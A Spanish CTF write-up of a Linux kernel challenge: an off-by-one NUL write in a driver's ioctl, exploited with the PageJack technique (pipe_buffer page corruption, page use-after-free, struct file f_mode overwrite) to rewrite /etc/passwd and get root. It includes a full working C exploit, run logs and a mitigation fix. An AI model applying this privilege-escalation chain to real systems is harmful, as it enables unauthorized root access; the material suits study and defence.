@@ -1,0 +1,469 @@
+---
+title: "IO_HO_FIRM 2.0: PageJack con un off-by-one NULL en el kernel"
+description: "Writeup de IO_HO_FIRM 2.0 (OEA Cyber Challenge 2026, HackRocks): un off-by-one NULL en un driver convertido en page UAF con PageJack, data-only, hasta leer la flag con su root."
+date: "2026-10-20"
+lang: "es"
+translationKey: "ioho-firm"
+tags: ["ciberseguridad", "ctf", "pwn", "kernel", "pagejack", "hackrocks"]
+author: "Felipe Cabrera"
+draft: false
+---
+
+IO_HO_FIRM 2.0 fue uno de los seis retos del OEA Cyber Challenge 2026 (sobre HackRocks), que jugué con Stefano Francolino en el equipo Never be Frog. Un solo byte NUL fuera de rango en un driver termina en una lectura de la flag como root, sin tocar una sola dirección del kernel. La técnica es PageJack, totalmente data-only. Este es el writeup.
+
+- **CTF:** OEA Cyber Challenge 2026 (HackRocks)
+- **Categoría:** kernel exploitation / pwn
+- **Servicio:** `ch4ll3ng3s.hackrocks.com:6767`
+- **Entorno:** initramfs Linux 6.13.0 SMP preempt, usuario uid 1000 (sin privilegios)
+- **Superficie:** `/dev/ioho_kd` (0666) + `/ioho_kd.ko`
+- **Objetivo:** `/flag` (0600, root)
+- **Autores:** Felipe Cabrera y Stefano Francolino
+
+## La idea
+
+El reto da una shell sin privilegios en una VM Linux mínima y expone un char device, `/dev/ioho_kd`, controlado por un módulo del kernel con dos ioctl:
+
+- `0xf000` (CMD_ALLOC): reserva un único objeto de `0x400` bytes en kmalloc-1k.
+- `0xf001` (CMD_WRITE): copia hasta `0x400` bytes del usuario y luego escribe un NUL en `obj[size]`.
+
+El bug: la comprobación rechaza `size > 0x400` pero permite `size == 0x400`. El terminador cae en `obj[0x400]`, el primer byte del objeto siguiente de la misma slab. Es un **off-by-one NULL de un solo byte**.
+
+El resto es la técnica **PageJack**, totalmente data-only:
+
+1. Colocar un array de `struct pipe_buffer` justo detrás de `obj` (ambos en kmalloc-1k).
+2. Anular el byte bajo de `bufs[0].page` de una pipe víctima. Como `struct page` está alineado a `0x40`, el puntero se redirige a una página física vecina, que es de otra pipe nuestra.
+3. Cerrar la pipe origen para liberar esa página; la víctima conserva un puntero obsoleto, es decir, un page UAF.
+4. Reclamar la página como slab de `struct file` abriendo `/etc/passwd` muchas veces.
+5. Escribir en `page+0xc` para sobrescribir `struct file->f_mode` y hacer escribible un fd abierto en `O_RDONLY`.
+6. Reescribir `/etc/passwd` con un hash conocido de root, `su root` con `1234` y leer `/flag`.
+
+Al ser data-only no hace falta KASLR, ROP ni `commit_creds`, así que `kptr_restrict` y `dmesg_restrict` no suponen ningún obstáculo.
+
+## Reconocimiento
+
+Al conectar, el servicio arranca una VM mínima y cede una shell BusyBox sin privilegios:
+
+```
+==========================================
+IO_HO_FIRM 2.0
+==========================================
+/ $ id
+uid=1000 gid=1000 groups=1000
+```
+
+El `/init` de la initramfs revela el montaje del reto:
+
+```sh
+chmod 600 /flag
+chown root:root /flag
+chmod u+s /bin/su
+...
+insmod /ioho_kd.ko
+chmod 666 /dev/ioho_kd
+setsid cttyhack setuidgid 1000 sh
+```
+
+y endurece el kernel:
+
+```sh
+sysctl -w kernel.perf_event_paranoid=3
+sysctl -w kernel.dmesg_restrict=1
+sysctl -w kernel.kptr_restrict=1
+```
+
+No hay compilador en la VM, solo BusyBox. El módulo sí es legible, así que se extrae con la propia shell:
+
+```
+/ $ base64 /ioho_kd.ko
+```
+
+El fichero resultante pesa 8720 bytes, `vermagic=6.13.0 SMP preempt mod_unload`.
+
+## Análisis del módulo
+
+El módulo conserva `.symtab`, lo que simplifica el análisis:
+
+| Símbolo | Tipo | Valor | Tamaño |
+|---------|------|-------|--------|
+| `module_ioctl` | STT_FUNC | `0x10` | `0x113` |
+| `obj` | STT_OBJECT | `0x0` | `0x8` |
+| `module_lock` | STT_OBJECT | `0x180` | `0x20` |
+| `vuln_dev` | STT_OBJECT | `0x0` | `0x50` |
+| `module_fops` | STT_OBJECT | `0x60` | `0x108` |
+
+`obj` es un puntero global a un único objeto del kernel. El handler registrado en `file_operations.unlocked_ioctl` es `module_ioctl`.
+
+El handler copia primero una `struct req` de 16 bytes y serializa con `mutex_lock(&module_lock)`:
+
+```c
+struct req {
+    size_t size;
+    char *data;
+};
+```
+
+### CMD_ALLOC (0xf000)
+
+```
+cmp qword ptr [obj], 0
+jne  ...                ; solo una asignacion
+mov  edx, 0x400         ; size = 0x400
+mov  esi, 0xdc0         ; GFP_KERNEL | __GFP_ZERO
+call __kmalloc_cache_noprof
+mov  [obj], rax
+```
+
+Reserva 1024 bytes (`0x400`) en kmalloc-1k, ya a cero.
+
+### CMD_WRITE (0xf001): la vulnerabilidad
+
+```
+mov rbx, [rsp]          ; rbx = req.size
+mov rsi, [rsp+8]        ; rsi = req.data
+mov rdi, [obj]          ; rdi = obj
+cmp rbx, 0x400
+ja   ...                ; rechaza size > 0x400
+...
+mov rdx, rbx
+call _copy_from_user    ; copy_from_user(obj, data, size)
+...
+mov rax, [obj]
+mov byte ptr [rax+rbx], 0   ; <-- obj[size] = 0
+```
+
+El fallo:
+
+- La comprobación es `size > 0x400`, así que `size == 0x400` pasa.
+- Tras copiar exactamente `0x400` bytes dentro del objeto, se escribe un NUL fuera de límites: `obj[0x400]`.
+- Ese offset cae en el primer byte del objeto siguiente de la misma slab kmalloc-1k.
+
+No es un desbordamiento grande: es un off-by-one NULL sobre el heap del kernel.
+
+## Explotación: PageJack
+
+### Qué ponemos detrás de obj
+
+Un `pipe()` reserva su array de buffers con `kcalloc(16, sizeof(struct pipe_buffer), GFP_KERNEL_ACCOUNT)`. En x86-64:
+
+| Campo | Offset | Tamaño |
+|-------|--------|--------|
+| `struct page *page` | `+0x00` | 8 |
+| `unsigned int offset` | `+0x08` | 4 |
+| `unsigned int len` | `+0x0c` | 4 |
+| `const struct pipe_buf_operations *ops` | `+0x10` | 8 |
+| `unsigned int flags` | `+0x18` | 4 |
+| `unsigned long private` | `+0x20` | 8 |
+| `sizeof(struct pipe_buffer)` | | `0x28` |
+
+El array de 16 entradas mide `16 * 0x28 = 0x280`, que también cae en kmalloc-1k. Si va justo detrás de `obj`, el NUL de `obj[0x400]` cae exactamente sobre el byte bajo de `bufs[0].page`.
+
+`struct page *` está alineado a `0x40`, así que su byte bajo solo puede ser `0x00`, `0x40`, `0x80` o `0xc0`. Anularlo redirige el puntero hasta tres entradas hacia atrás en el array de `struct page` (vmemmap), es decir, a una página física vecina. Si esa página es la de datos de otra pipe que controlamos, la pipe víctima pasa a leer y escribir la página de otra pipe.
+
+### Heap grooming
+
+```c
+#define NPIPES 0x180   /* 384 pipes */
+#define NOPEN  0x60    /* 96 aperturas de /etc/passwd */
+#define MAGIC  0x4f485100u
+
+for (i = 0; i < NPIPES/2; i++) pipe(pfd[i]);   /* primera mitad */
+c_alloc();                                      /* ioctl(0xf000) */
+for (i = NPIPES/2; i < NPIPES; i++) pipe(pfd[i]); /* segunda mitad */
+```
+
+Con la freelist LIFO de SLUB, `obj` queda intercalado entre arrays de `pipe_buffer`. Luego se ceba cada pipe con 12 bytes (un marcador único), de modo que cada pipe obtiene una página de datos y `bufs[0] = {page_i, offset=0, len=0xc}`. Las páginas se asignan en un bucle apretado, así que muchas quedan físicamente contiguas.
+
+### Disparo y detección
+
+```c
+unsigned char big[0x400];
+memset(big, 0x41, sizeof(big));
+c_write(big, 0x400);   /* copia 0x400 + obj[0x400] = 0 */
+```
+
+Se leen 4 bytes de cada pipe. La pipe normal `i` devuelve `MAGIC | i`; la víctima, cuyo `page` fue redirigido a la página de `origin`, devuelve `MAGIC | origin`. Si el byte bajo del puntero ya era `0x00`, no hay víctima y se reintenta con otra conexión.
+
+### Page UAF y reclamación
+
+```c
+close(pfd[origin][0]);
+close(pfd[origin][1]);   /* libera la pagina de origin */
+```
+
+La pipe víctima sigue apuntando a esa página sin referencia: page UAF. Se reclama abriendo `/etc/passwd` 96 veces; cada `open` asigna un `struct file` de la cache filp, y la página liberada se reutiliza como slab de `struct file` con el primer objeto en el offset 0.
+
+### Solapamiento de f_mode
+
+Tras el escaneo, la pipe víctima tiene `offset = 4` y `len = 8` (se leyeron 4 de los `0xc` bytes), así que el siguiente `write` cae en `offset + len = 0xc`:
+
+```c
+unsigned int fake_mode = 0x084f801f;  /* FMODE_WRITE (0x2), FMODE_READ, ... */
+write(pfd[victim][1], &fake_mode, 4); /* escribe en page+0xc */
+```
+
+Ese `page+0xc` es `struct file->f_mode` del primer `struct file` de la página. El valor activa `FMODE_WRITE`, así que un fd abierto en `O_RDONLY` pasa a ser escribible. Después se prueba cada fd escribiendo el nuevo `/etc/passwd`:
+
+```
+root:$1$II95DxKV$0b0LeHZZDTaQK.VinipJN/:0:0:root:/root:/bin/sh
+ctf:x:1000:1000:ctf:/home/ctf:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+```
+
+El hash `$1$II95DxKV$0b0LeHZZDTaQK.VinipJN/` es el md5crypt de `1234` (verificado con `passlib.hash.md5_crypt.verify`).
+
+### Su root y flag
+
+```c
+execl("/bin/su", "su", "root", NULL);
+```
+
+`/bin/su` es setuid root. Se mete `1234`, se obtiene shell de root y se lee `/flag`. Como el exploit hace `exec`, los fds (y la página prestada) siguen vivos durante el `su`.
+
+## Ejecución real
+
+El exploit se compila como ELF x86-64 estático (sin intérprete, para la initramfs sin libc) y se sube por la shell en base64+gzip:
+
+```sh
+echo <linea_b64> >> /tmp/b64
+base64 -d /tmp/b64 > /tmp/exp.gz
+gunzip -c /tmp/exp.gz > /tmp/exp
+chmod +x /tmp/exp
+md5sum /tmp/exp    # se compara con el MD5 local
+```
+
+con `stty -echo` para que el terminal no devuelva el payload.
+
+**Intento 1 (página controlada, pero sin fd escribible):**
+
+```
+[+] victim=256 origin=0
+[+] closed origin pipe 0 -> page freed
+[+] opened 96 /etc/passwd fds
+[+] f_mode overwrite write=4 errno=0
+[-] no writable passwd fd
+```
+
+El UAF y el write a `page+0xc` funcionaron, pero la página no fue reclamada por ninguno de nuestros 96 `struct file` (la reclamación es probabilística). Se reintenta.
+
+**Intento 2 (éxito):**
+
+```
+[+] victim=192 origin=191
+[+] closed origin pipe 191 -> page freed
+[+] opened 96 /etc/passwd fds
+[+] f_mode overwrite write=4 errno=0
+[+] PWNED idx=3 wrote=150
+[+] passwd rebuilt, exec su root (password 1234)
+Password:
+/ # id
+/ # cat /flag
+p4g3j4ck_h1ts_d1ff
+/ # wc -c /flag
+20 /flag
+/ # xxd /flag
+00000000: 0a70 3467 336a 3463 6b5f 6831 7473 5f64  .p4g3j4ck_h1ts_d
+00000010: 3166 660a                                1ff.
+```
+
+El fichero `/flag` contiene `\n p4g3j4ck_h1ts_d1ff \n`: 20 bytes (18 caracteres más dos saltos de línea).
+
+**Flag:** `p4g3j4ck_h1ts_d1ff`
+
+## Puntos clave
+
+1. **Bug lógico.** El `copy_from_user` está bien acotado; lo que falta es validar el terminador NUL (`size == 0x400`).
+2. **Data-only.** Sin direcciones del kernel, KASLR, ROP ni `commit_creds`. Por eso `kptr_restrict` y `dmesg_restrict` no importan.
+3. **El NUL basta.** La alineación de `struct page` a `0x40` hace que anular el LSB redirija a una página vecina; el grooming garantiza que esa vecina sea nuestra.
+4. **Page UAF + reclaim.** Cerrar `origin` libera la página; abrir `/etc/passwd` la convierte en slab de `struct file`; el offset `0xc` coincide con `f_mode`.
+5. **Reintentos.** Tanto la elección de víctima (LSB ya cero) como la reclamación por filp son probabilísticas. El intento 1 dio no writable; el 2 funcionó.
+
+## Mitigación
+
+```c
+/* MAL */
+if (size > 0x400) return -EINVAL;
+...
+obj[size] = 0;
+
+/* BIEN */
+if (size >= 0x400) return -EINVAL;  /* o reservar 0x401 */
+/* y no hace falta terminador: el objeto ya se asigno con __GFP_ZERO */
+```
+
+Alternativas: eliminar del todo la escritura del NUL (el buffer ya está a cero) o acotar estrictamente sin terminador fuera de rango. Endurecimientos como `kptr_restrict`, `dmesg_restrict` o SLUB freelist hardening no mitigan este fallo, porque el problema es un OOB lógico de un byte.
+
+## Apéndice: exploit
+
+`exp.c`:
+
+```c
+// IO_HO_FIRM 2.0 -- PageJack: off-by-one NULL -> pipe_buffer.page LSB -> page UAF
+// -> reclaim freed page as filp slab -> overwrite struct file->f_mode at +0xc
+// -> make /etc/passwd writable -> rebuild passwd -> su root -> cat /flag
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <stdint.h>
+#include <sys/ioctl.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+
+#define DEV "/dev/ioho_kd"
+#define CMD_ALLOC 0xf000
+#define CMD_WRITE 0xf001
+#define OBJ_SIZE 0x400
+
+#ifndef NPIPES
+#define NPIPES 0x180   /* total pipes (2*NPIPES fds) */
+#endif
+#ifndef NOPEN
+#define NOPEN 0x60
+#endif
+
+#define MAGIC 0x4f485100u   /* 'OHQ' + idx low byte */
+
+typedef struct { size_t size; char *data; } req_t;
+
+static int devfd;
+static int pfd[NPIPES][2];
+
+static long c_alloc(void){ req_t r; memset(&r,0,sizeof(r)); return ioctl(devfd, CMD_ALLOC,&r); }
+static long c_write(void*buf,size_t sz){ req_t r; r.size=sz; r.data=(char*)buf; return ioctl(devfd,CMD_WRITE,&r); }
+
+static void pause_forever(void){ while(1) pause(); }
+
+int main(void){
+    setvbuf(stdout,NULL,_IONBF,0);
+    setvbuf(stderr,NULL,_IONBF,0);
+
+    devfd = open(DEV, O_RDWR);
+    printf("[+] open %s = %d (errno=%d)\n", DEV, devfd, errno);
+    if(devfd<0) return 1;
+
+    unsigned char mb[0xc];
+    unsigned int m;
+
+    /* Phase 1: create first half of pipes (their kmalloc-1k bufs arrays) */
+    for(int i=0;i<NPIPES/2;i++){
+        if(pipe(pfd[i])<0){ printf("[-] pipe %d errno=%d\n",i,errno); return 2; }
+    }
+
+    /* Allocate the single global kernel object (kmalloc-1k) */
+    long r = c_alloc();
+    printf("[+] CMD_ALLOC ret=%ld\n", r);
+
+    /* Phase 2: create second half of pipes */
+    for(int i=NPIPES/2;i<NPIPES;i++){
+        if(pipe(pfd[i])<0){ printf("[-] pipe %d errno=%d\n",i,errno); return 2; }
+    }
+    printf("[+] created %d pipes\n", NPIPES);
+
+    /* Prime every pipe with a marker in ONE tight loop so the backing pages
+       are allocated consecutively -> victim's page neighbours are our pages. */
+    for(int i=0;i<NPIPES;i++){
+        m = MAGIC | (unsigned int)i;
+        memcpy(mb,&m,4); memset(mb+4,0,8);
+        if(write(pfd[i][1],mb,0xc)!=0xc){ printf("[-] w %d errno=%d\n",i,errno); return 2; }
+    }
+    printf("[+] primed all pipes\n");
+
+    /* Trigger the off-by-one NULL into obj+0x400 => bufs[0].page LSB */
+    unsigned char big[OBJ_SIZE];
+    memset(big,0x41,sizeof(big));
+    r = c_write(big,OBJ_SIZE);
+    printf("[+] CMD_WRITE(0x400) ret=%ld\n", r);
+
+    /* Detect victim pipe: its bufs[0].page now points to another pipe page */
+    int victim=-1, origin=-1;
+    unsigned int seen[NPIPES];
+    for(int i=0;i<NPIPES;i++){
+        unsigned int v=0;
+        ssize_t n = read(pfd[i][0], &v, 4);
+        seen[i]=v;
+        if(n!=4){ printf("[!] short read %d n=%zd errno=%d\n", i, n, errno); }
+    }
+    for(int i=0;i<NPIPES;i++){
+        unsigned int v = seen[i];
+        if((v & 0xffffff00u) != (MAGIC & 0xffffff00u)) continue; /* not one of ours */
+        int idx = (int)(v & 0xff);
+        if(idx != i){ victim=i; origin=idx; break; }
+    }
+
+    printf("[+] victim=%d origin=%d\n", victim, origin);
+    if(victim<0){ printf("[-] no victim (LSB already 0?)\n"); pause_forever(); return 3; }
+    if(origin<0 || origin>=NPIPES || origin==victim || ((seen[origin] & 0xffffff00u)!=(MAGIC & 0xffffff00u))){
+        printf("[-] bad origin=%d (seen=0x%08x)\n", origin, origin>=0&&origin<NPIPES?seen[origin]:0);
+        pause_forever(); return 4;
+    }
+
+    /* Free origin's page while victim still references it (page UAF) */
+    close(pfd[origin][0]);
+    close(pfd[origin][1]);
+    printf("[+] closed origin pipe %d -> page freed\n", origin);
+
+    /* Reclaim the freed page as a filp slab */
+    int ff[NOPEN];
+    for(int i=0;i<NOPEN;i++) ff[i] = -1;
+    for(int i=0;i<NOPEN;i++){
+        ff[i] = open("/etc/passwd", O_RDONLY);
+        if(ff[i]<0) printf("[!] open passwd %d errno=%d\n", i, errno);
+    }
+    printf("[+] opened %d /etc/passwd fds\n", NOPEN);
+
+    /* Write at page+0xc => struct file->f_mode (offset+len == 0xc invariant) */
+    unsigned int fake_mode = 0x084f801f;
+    ssize_t w = write(pfd[victim][1], &fake_mode, 4);
+    printf("[+] f_mode overwrite write=%zd errno=%d\n", w, errno);
+
+    /* Rebuild /etc/passwd via whichever fd became writable */
+    const char *payload =
+        "root:$1$II95DxKV$0b0LeHZZDTaQK.VinipJN/:0:0:root:/root:/bin/sh\n"
+        "ctf:x:1000:1000:ctf:/home/ctf:/bin/sh\n"
+        "nobody:x:65534:65534:nobody:/nonexistent:/bin/sh\n";
+    int okfd=-1;
+    for(int i=0;i<NOPEN;i++){
+        if(ff[i]<0) continue;
+        lseek(ff[i],0,SEEK_SET);
+        ssize_t n = write(ff[i], payload, strlen(payload));
+        if(n>0){ okfd=ff[i]; printf("[+] PWNED idx=%d wrote=%zd\n", i, n); break; }
+    }
+
+    if(okfd<0){ printf("[-] no writable passwd fd\n"); pause_forever(); return 5; }
+
+    printf("[+] passwd rebuilt, exec su root (password 1234)\n");
+    /* exec su: fds stay open so the foreign page is never put_page'd */
+    execl("/bin/su", "su", "root", (char*)NULL);
+    printf("[-] exec su failed errno=%d\n", errno);
+    if(fork()==0) pause_forever();
+    return 0;
+}
+```
+
+### Reproducción
+
+Desde el directorio de trabajo:
+
+```
+python ioho/solve.py 2
+```
+
+O a mano, una vez conectado al servicio:
+
+```sh
+stty -echo
+# subir exp.b64 linea a linea con: echo <linea> >> /tmp/b64
+base64 -d /tmp/b64 > /tmp/exp.gz
+gunzip -c /tmp/exp.gz > /tmp/exp; chmod +x /tmp/exp
+/tmp/exp
+# cuando aparezca "Password:":
+1234
+cat /flag
+```
+
+---
+
+Relacionado: [recap del OEA Cyber Challenge 2026](/blog/oea-cyber-challenge-2026) · [GitHub](https://github.com/felicabrera)
